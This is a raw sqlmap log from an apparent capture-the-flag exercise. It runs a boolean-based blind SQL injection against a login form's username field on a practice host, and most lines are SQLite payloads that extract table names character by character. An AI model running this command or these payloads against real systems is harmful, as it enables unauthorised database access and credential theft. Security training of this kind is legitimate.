$ sqlmap -u 'http://ctf.adl.tw:12004/login.php' --data 'ctf_username=*+&ctf_password=asdasd' --level 5 --risk 3 --technique B --dbms sqlite --tables -v 3

[08:08:50] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),1,1)>CAST(X'33' AS TEXT)-- JBJd
[08:08:50] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),1,1)>CAST(X'30' AS TEXT)-- JBJd
[08:08:51] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),1,1)>CAST(X'31' AS TEXT)-- JBJd
[08:08:51] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),2,1)>CAST(X'33' AS TEXT)-- JBJd
[08:08:52] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),2,1)>CAST(X'30' AS TEXT)-- JBJd
[08:08:52] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),2,1)>CAST(X'31' AS TEXT)-- JBJd
[08:08:52] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),2,1)>CAST(X'32' AS TEXT)-- JBJd
[08:08:53] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),3,1)>CAST(X'33' AS TEXT)-- JBJd
[08:08:53] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),3,1)>CAST(X'30' AS TEXT)-- JBJd
[08:08:53] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(COUNT(tbl_name) AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT)),3,1)>CAST(X'09' AS TEXT)-- JBJd
[08:08:53] [INFO] retrieved: 12
[08:08:53] [DEBUG] performed 10 queries in 3.57 seconds
[08:08:53] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),1,1)>CAST(X'41' AS TEXT)-- PvTJ
[08:08:54] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),1,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:08:54] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),1,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:08:54] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),1,1)>CAST(X'78' AS TEXT)-- PvTJ
[08:08:54] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),1,1)>CAST(X'74' AS TEXT)-- PvTJ
[08:08:55] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),1,1)>CAST(X'72' AS TEXT)-- PvTJ
[08:08:55] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),1,1)>CAST(X'73' AS TEXT)-- PvTJ
[08:08:55] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),2,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:08:55] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),2,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:08:56] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),2,1)>CAST(X'78' AS TEXT)-- PvTJ
[08:08:56] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),2,1)>CAST(X'74' AS TEXT)-- PvTJ
[08:08:56] [DEBUG] turning off reflection removal mechanism (for optimization purposes)
[08:08:56] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),2,1)>CAST(X'72' AS TEXT)-- PvTJ
[08:08:56] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),2,1)>CAST(X'71' AS TEXT)-- PvTJ
[08:08:57] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),3,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:08:57] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),3,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:08:57] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),3,1)>CAST(X'68' AS TEXT)-- PvTJ
[08:08:58] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),3,1)>CAST(X'6c' AS TEXT)-- PvTJ
[08:08:59] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),3,1)>CAST(X'6a' AS TEXT)-- PvTJ
[08:08:59] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),3,1)>CAST(X'6b' AS TEXT)-- PvTJ
[08:09:00] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),4,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:00] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),4,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:01] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),4,1)>CAST(X'68' AS TEXT)-- PvTJ
[08:09:01] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),4,1)>CAST(X'6c' AS TEXT)-- PvTJ
[08:09:01] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),4,1)>CAST(X'6a' AS TEXT)-- PvTJ
[08:09:01] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),4,1)>CAST(X'69' AS TEXT)-- PvTJ
[08:09:02] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),5,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:02] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),5,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:02] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),5,1)>CAST(X'78' AS TEXT)-- PvTJ
[08:09:02] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),5,1)>CAST(X'74' AS TEXT)-- PvTJ
[08:09:03] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),5,1)>CAST(X'72' AS TEXT)-- PvTJ
[08:09:03] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),5,1)>CAST(X'73' AS TEXT)-- PvTJ
[08:09:03] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),6,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:03] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),6,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:03] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),6,1)>CAST(X'68' AS TEXT)-- PvTJ
[08:09:04] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),6,1)>CAST(X'64' AS TEXT)-- PvTJ
[08:09:04] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),6,1)>CAST(X'66' AS TEXT)-- PvTJ
[08:09:04] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),6,1)>CAST(X'65' AS TEXT)-- PvTJ
[08:09:04] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),7,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:04] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),7,1)>CAST(X'31' AS TEXT)-- PvTJ
[08:09:05] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),7,1)>CAST(X'48' AS TEXT)-- PvTJ
[08:09:05] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),7,1)>CAST(X'54' AS TEXT)-- PvTJ
[08:09:05] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),7,1)>CAST(X'5a' AS TEXT)-- PvTJ
[08:09:06] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),7,1)>CAST(X'5d' AS TEXT)-- PvTJ
[08:09:06] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),7,1)>CAST(X'5e' AS TEXT)-- PvTJ
[08:09:06] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),7,1)>CAST(X'5f' AS TEXT)-- PvTJ
[08:09:07] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),8,1)>CAST(X'41' AS TEXT)-- PvTJ
[08:09:07] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),8,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:07] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),8,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:08] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),8,1)>CAST(X'78' AS TEXT)-- PvTJ
[08:09:09] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),8,1)>CAST(X'74' AS TEXT)-- PvTJ
[08:09:10] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),8,1)>CAST(X'72' AS TEXT)-- PvTJ
[08:09:10] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),8,1)>CAST(X'73' AS TEXT)-- PvTJ
[08:09:10] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),9,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:11] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),9,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:11] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),9,1)>CAST(X'68' AS TEXT)-- PvTJ
[08:09:13] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),9,1)>CAST(X'64' AS TEXT)-- PvTJ
[08:09:14] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),9,1)>CAST(X'66' AS TEXT)-- PvTJ
[08:09:14] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),9,1)>CAST(X'65' AS TEXT)-- PvTJ
[08:09:15] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),10,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:16] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),10,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:16] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),10,1)>CAST(X'78' AS TEXT)-- PvTJ
[08:09:16] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),10,1)>CAST(X'74' AS TEXT)-- PvTJ
[08:09:16] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),10,1)>CAST(X'72' AS TEXT)-- PvTJ
[08:09:17] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),10,1)>CAST(X'71' AS TEXT)-- PvTJ
[08:09:17] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),11,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:17] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),11,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:18] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),11,1)>CAST(X'78' AS TEXT)-- PvTJ
[08:09:18] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),11,1)>CAST(X'74' AS TEXT)-- PvTJ
[08:09:18] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),11,1)>CAST(X'76' AS TEXT)-- PvTJ
[08:09:18] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),11,1)>CAST(X'75' AS TEXT)-- PvTJ
[08:09:19] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),12,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:19] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),12,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:19] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),12,1)>CAST(X'68' AS TEXT)-- PvTJ
[08:09:19] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),12,1)>CAST(X'64' AS TEXT)-- PvTJ
[08:09:20] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),12,1)>CAST(X'66' AS TEXT)-- PvTJ
[08:09:21] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),12,1)>CAST(X'65' AS TEXT)-- PvTJ
[08:09:21] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),13,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:21] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),13,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:22] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),13,1)>CAST(X'68' AS TEXT)-- PvTJ
[08:09:22] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),13,1)>CAST(X'6c' AS TEXT)-- PvTJ
[08:09:22] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),13,1)>CAST(X'6e' AS TEXT)-- PvTJ
[08:09:23] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),13,1)>CAST(X'6d' AS TEXT)-- PvTJ
[08:09:23] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),14,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:23] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),14,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:24] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),14,1)>CAST(X'68' AS TEXT)-- PvTJ
[08:09:24] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),14,1)>CAST(X'64' AS TEXT)-- PvTJ
[08:09:24] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),14,1)>CAST(X'62' AS TEXT)-- PvTJ
[08:09:24] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),14,1)>CAST(X'63' AS TEXT)-- PvTJ
[08:09:25] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),15,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:25] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),15,1)>CAST(X'70' AS TEXT)-- PvTJ
[08:09:25] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),15,1)>CAST(X'68' AS TEXT)-- PvTJ
[08:09:26] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),15,1)>CAST(X'64' AS TEXT)-- PvTJ
[08:09:26] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),15,1)>CAST(X'66' AS TEXT)-- PvTJ
